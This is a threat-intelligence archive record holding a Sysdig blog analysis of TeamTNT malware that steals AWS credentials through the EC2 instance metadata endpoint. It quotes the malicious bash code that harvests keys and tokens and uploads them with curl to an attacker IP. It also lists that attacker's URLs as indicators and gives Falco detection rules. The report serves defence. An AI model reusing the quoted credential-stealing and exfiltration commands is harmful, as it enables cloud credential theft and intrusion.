@@ -1,0 +1,100 @@
+{
+    "id": "cd1672ea-1116-40fa-b31f-bdf03c5f932e",
+    "created_at": "2023-01-12T15:06:09.189538Z",
+    "updated_at": "2025-03-27T02:12:11.052923Z",
+    "deleted_at": null,
+    "sha1_hash": "51f1706e46df1804fa7f2b46adf09e471715f370",
+    "title": "2021-12-07 - Threat news- TeamTNT stealing credentials using EC2 Instance Metadata",
+    "authors": "",
+    "file_creation_date": "2022-05-28T17:30:55Z",
+    "file_modification_date": "2022-05-28T17:30:55Z",
+    "file_size": 483527,
+    "plain_text": "# Threat news: TeamTNT stealing credentials using EC2 Instance Metadata\n\n**sysdig.com/blog/teamtnt-aws-credentials/**\n\nBy Alberto Pellitteri December 7, 2021\n\n**The Sysdig Threat Research Team has detected an attack that can be attributed to the**\n**TeamTNT. The initial target was a Kubernetes pod exposed outside the network. Once**\naccess was gained, the malware attempted to steal AWS credentials using the EC2\n**instance metadata.**\n\n**TeamTNT is a threat actor that conducts large-scale attacks against virtual and cloud**\nsolutions, like Kubernetes and Docker. Previous attacks displayed motives concerned with\n**cryptocurrency mining and stealing credentials, but this time a new strategy that**\nleverages AWS metadata was employed. Excessive permissions can be exploited in the\ncloud platform and may result in lateral movement attacks.\n\nIn this short article you will learn how this attack works, the associated risks, and how to\n**detect it.**\n\n## Situation\n\n\n-----\n\n**TeamTNT exploited a** **[WordPress pod deployed on a Kubernetes cluster via its](https://wordpress.com/)**\n[misconfigured dashboard, which was then brute-forced and allowed remote command](https://attack.mitre.org/techniques/T1110/)\nexecutions. After access is gained to the vulnerable container, the malware uses the `wget`\ncommand to download the malicious bash script `aws2.sh .`\n\nThe Sysdig Threat Research Team analyzed this script and found that it attempts to obtain\nAWS credentials using four different strategies.\n\n1. First, it checks if any AWS credentials have been exported as environment variables on\n\nthe compromised system.\n2. Then, it looks for any AWS keys by inspecting docker containers currently running on\n\nthe victim.\n3. If the `/.aws/credentials path exists in either the` `/root filesystem or in any`\n```\n   /home/ directories, they are searched for credentials.\n\n```\n4. It fetches AWS metadata from the victim machine in order to get the IAM role\n\ncredentials associated with it: `aws_access_key_id,` `aws_secret_access_key,`\n```\n   aws_session_token .\n\n```\nThe last strategy is the most recent and interesting one that has been adopted by TeamTNT\n**to steal AWS credentials.**\n\n## Impact\n\n\n-----\n\nAWS metadata, as well as user data, is used to configure and manage any EC2 instance\nthat you run in AWS. It can be accessed only from your running instance via the following\nURI (over IPv4): `http://169.254.169.254/latest/meta-data/ .`\n\nBelow is a sampling of the kind of data which the endpoint contains.\n\nYou can use it to retrieve information about the instance and some network settings (like the\nlocal and public IPv4 addresses). But above all, it keeps track of the IAM role that is\nassigned to an instance. The latter information can be leveraged by the attackers.\n\nBelow is taken from the malicious script and shows how the attackers access and extract\nsensitive information from the metadata endpoint.\n\n\n-----\n\n```\n...\nfunction AWS_META_DATA_CREDS(){\nexport TNT_AWS_ACCESS_KEY=$(curl --max-time $T1O --connect-timeout $T1O -sLk\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -sLk\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/) | grep\n'AccessKeyId' | sed 's/ \"AccessKeyId\" : \"/aws_access_key_id = /g' | sed 's/\",//g')\nif [ ! -z \"$TNT_AWS_ACCESS_KEY\" ]; then\nexport TNT_AWS_SECRET_KEY=$(curl --max-time $T1O --connect-timeout $T1O -sLk\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -sLk\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/) | grep\n'SecretAccessKey' | sed 's/ \"SecretAccessKey\" : \"/aws_secret_access_key = /g' | sed\n's/\",//g')\n…\nfi\nif [ ! -z \"$TNT_AWS_SECRET_KEY\" ]; then\nexport TNT_AWS_SESSION_TOKEN=$(curl --max-time $T1O --connect-timeout $T1O -sLk\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -sLk\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/) | grep 'Token' |\nsed 's/ \"Token\" : \"/aws_session_token = /g' | sed 's/\",//g')\nFi\n...\necho $TNT_AWS_ACCESS_KEY >> $STEALER_OUT\necho $TNT_AWS_SECRET_KEY >> $STEALER_OUT\necho $TNT_AWS_SESSION_TOKEN >> $STEALER_OUT\n...\n\n```\nFinally, once this information has been stored into the `STEALER_OUT file, data` [exfiltration](https://attack.mitre.org/tactics/TA0010/)\noccurs with the uploading of the file to an attacker controlled server.\n```\n...\nif [ -f $STEALER_OUT ]; then\ncat $STEALER_OUT\ncurl -F \"[email protected]$STEALER_OUT\" http://84.201.153.234/wpcontent/themes/twentyseventeen/.a/upload2.php\nrm -f $STEALER_OUT 2>/dev/null 1>/dev/null\nfi\n...\n\n```\nThe impact of this new threat can thus lead to the theft of AWS credentials. Attackers will\ntherefore be able to exploit them in order to carry out lateral movements in the cloud!\n\n## Mitigations\n\nAs always, ensure that your services are protected with robust multi-factor authentication\nsystems and up-to-date, vulnerability-free components. However, there are some specific\nsteps that can be taken to counter this threat.\n\nIn AWS, you cannot enable access control rules to prevent unauthorized access to the EC2\ninstance metadata. Instead, you can adopt some strategies that limit the risks associated\nwith AWS credential theft:\n\n\n-----\n\nIf your instance doesn t need to have access to metadata, it should be disabled. This\nminimizes the attack surface and avoids AWS credentials theft.\nYou can also replace the default IMDSv1 method with the newer IMDSv2 for\n**accessing instance metadata. IMDSv2 uses session-oriented requests and provides**\na session token that can be used to make requests for metadata and credentials.\nOnly assign a role to the EC2 instance if strictly necessary.\nIf you have attached an IAM role to an EC2 instance, make sure you have granted it\nthe **[minimum privileges required to run its tasks.](https://sysdig.com/blog/ciem-security-sysdig-secure/)**\n\nFor example, according to the latter scenario, if your EC2 instance needs only read\npermissions for an AWS S3 bucket, you shouldn’t provide write permissions to it as well. In\naddition to restricting AWS actions, like read, list, and write to a bucket, you should also\nspecify which AWS resources can be accessed. This may limit unauthorized access to\nsensitive data.\n\nBelow is reported an insecure policy:\n```\n{\n \"Version\": \"2012-10-17\",\n \"Statement\": [\n  {\n   \"Effect\": \"Allow\",\n   \"Action\": [\"s3:*\"],\n   \"Resource\": [\"*\"]\n  }\n ]\n}\n\n```\nInstead, a more secure policy would be:\n```\n{\n \"Version\": \"2012-10-17\",\n \"Statement\": [\n  {\n     \"Principal\": {\n   \"AWS\":\"arn:aws:iam::<aws-account>:role/<iam-role-for-s3-access>”\n     }\n   \"Effect\": \"Allow\",\n   \"Action\": [\"s3:ListBucket”,\n     “s3:GetObject\"],\n   \"Resource\": [\"arn:aws:s3:::<s3-bucket-name>\"]\n  }\n ]\n}\n\n## Detection\n\n```\n\n-----\n\nDetection of the methods carried out by TeamTNT to steal credentials can be accomplished\nusing [Falco. Falco is a](https://falco.org/) [CNCF incubating project for runtime threat detection for containers](https://www.cncf.io/projects/)\nand Kubernetes.\n\nYou can leverage Falco’s powerful and flexible rules language to detect suspicious behaviors\nand generate events. Falco comes with a predefined set of rules, but you can also customize\nthem or create new ones that fit your needs as you want.\n\nThere are two rules in the default ruleset which will detect whenever a container\nunexpectedly tries to reach the EC2 instance metadata:\n```\n- rule: Contact EC2 Instance Metadata Service From Container\n desc: Detect attempts to contact the EC2 Instance Metadata Service from a container\n condition: outbound and fd.sip=\"169.254.169.254\" and container and not\nec2_metadata_containers\n output: Outbound connection to EC2 instance metadata service (command=%proc.cmdline\nconnection=%fd.name %container.info\nimage=%container.image.repository:%container.image.tag)\n priority: NOTICE\n tags: [network, aws, container, mitre_discovery]\n- rule: Contact cloud metadata service from container\n desc: Detect attempts to contact the Cloud Instance Metadata Service from a\ncontainer\n condition: outbound and fd.sip=\"169.254.169.254\" and container and\nconsider_metadata_access and not user_known_metadata_access\n output: Outbound connection to cloud instance metadata service\n(command=%proc.cmdline connection=%fd.name %container.info\nimage=%container.image.repository:%container.image.tag)\n priority: NOTICE\n tags: [network, container, mitre_discovery]\n\n```\nIf you want to know more about these rules, you can check the full rule descriptions on\nGitHub.\n\nAlternatively, the Find AWS Credentials rule can detect suspicious `grep or` `find`\ncommands that are attempting to discover AWS credential files. This rule is included with\n[Sysdig Secure.](https://sysdig.com/products/secure/)\n\n\n-----\n\n```\n macro: private_aws_credentials\n condition: >\n (proc.args icontains \"aws_access_key_id\" or\n proc.args icontains \"aws_secret_access_key\" or\n proc.args icontains \"aws_session_token\" or\n proc.args icontains \"accesskeyid\" or\n proc.args icontains \"secretaccesskey\")\n- rule: Find AWS Credentials\n description: Detect AWS creds\n condition: >\n     spawned_process and\n   ((grep_commands and private_aws_credentials) or\n   (proc.name = \"find\" and proc.args endswith \".aws/credentials\"))\n output: Grep AWS credentials activities found (user=%user.name\nuser_loginuid=%user.loginuid command=%proc.cmdline container_id=%container.id\ncontainer_name=%container.name\nimage=%container.image.repository:%container.image.tag)\n priority: NOTICE\n tags: mitre_credential_access, process\n\n### Summary of indicators of compromise (IoC) and suspicious activities\n\n```\n**IPs & URLs**\n\n84.201.153.234\nhttp://84.201.153.234/wp-content/themes/twentyseventeen/.a/aws2.sh\nhttp://84.201.153.234/wp-content/themes/twentyseventeen/.a/upload2.php\n\n**MD5**\n\n```\naws2.sh\n\n```\n\n6eb1c1b3acbb0a71013826d512b3ebb6\n\n**Filenames**\n\naws2.sh\nTeamTNT_AWS_STEALER_v2.txt\n.tnt.aws.lock\n\n**Suspicious activities**\n\nThere are a few suspicious activities worth mentioning in our TeamTNT malware analysis:\n```\n   wget is launched in runtime, not build time, to download the malicious bash script\n   aws2.sh .\n\n```\nNetwork communication with the AWS metadata.\n\n\n-----\n\nSysdig Secure includes several rules which use indicators of compromise to generate events\nwhen seen. These are automatically updated as the Sysdig Threat Research Team\n**discovers them in order to provide the most up to date protection.**\n\nSysdig Secure IoC rules:\n\nMalicious IPs or domains detected on command line\nMalicious binary detected\nMalicious process detected\n\n## Conclusion\n\nThis incident proves that threats are always evolving. TeamTNT malware has been\nimproved so that it is able to steal AWS credentials even if they are not directly stored inside\nthe victim container. This may allow the threat actor to exploit your stolen credentials in\norder to perform lateral movement attacks.\n\nIf you want to adopt runtime security tools, you can choose Falco, “the open source standard\nfor continuous risk and threat detection across Kubernetes, containers, and cloud”.\n\nIf you would like to find out more about Falco:\n\nGet started at [Falco.org.](http://falco.org/)\n[Check out the Falco project on GitHub.](https://github.com/falcosecurity/falco)\n[Get involved with the Falco community.](https://falco.org/community/)\n[Meet the maintainers on the Falco Slack.](https://kubernetes.slack.com/?redir=%2Farchives%2FCMWH3EH32)\nFollow [@falco_org on Twitter.](https://twitter.com/falco_org)\n\nAt [Sysdig Secure, we extend Falco with out-of-the-box rules, along with other open source](https://sysdig.com/products/secure/)\nprojects, making it even easier to work with and manage cloud security.\n\nIf using Sysdig Secure, the attempt to use the instance metadata endpoint would generate\nan event that looks similar to the image below.\n\n\n-----\n\n[Register for our free 30-day trial and see for yourself!](https://sysdig.com/company/free-trial/)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-07 - Threat news- TeamTNT stealing credentials using EC2 Instance Metadata.pdf"
+    ],
+    "report_names": [
+        "2021-12-07 - Threat news- TeamTNT stealing credentials using EC2 Instance Metadata.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
+            "created_at": "2022-10-25T16:07:23.773944Z",
+            "updated_at": "2025-03-27T02:02:09.974695Z",
+            "deleted_at": null,
+            "main_name": "Lead",
+            "aliases": [
+                "Casper",
+                "TG-3279"
+            ],
+            "source_name": "ETDA:Lead",
+            "tools": [
+                "Agentemis",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "RbDoor",
+                "RibDoor",
+                "Winnti",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
+            "created_at": "2023-01-06T13:46:39.186988Z",
+            "updated_at": "2025-03-27T02:00:03.016358Z",
+            "deleted_at": null,
+            "main_name": "TeamTNT",
+            "aliases": [
+                "Adept Libra"
+            ],
+            "source_name": "MISPGALAXY:TeamTNT",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
+            "created_at": "2022-10-25T15:50:23.334495Z",
+            "updated_at": "2025-03-27T02:00:55.445098Z",
+            "deleted_at": null,
+            "main_name": "TeamTNT",
+            "aliases": [
+                "TeamTNT"
+            ],
+            "source_name": "MITRE:TeamTNT",
+            "tools": [
+                "Peirates",
+                "MimiPenguin",
+                "LaZagne",
+                "Hildegard"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535969,
+    "ts_updated_at": 1743041531,
+    "ts_creation_date": 1653759055,
+    "ts_modification_date": 1653759055,
+    "files": {
+        "pdf": "https://archive.orkl.eu/51f1706e46df1804fa7f2b46adf09e471715f370.pdf",
+        "text": "https://archive.orkl.eu/51f1706e46df1804fa7f2b46adf09e471715f370.txt",
+        "img": "https://archive.orkl.eu/51f1706e46df1804fa7f2b46adf09e471715f370.jpg"
+    }
+}
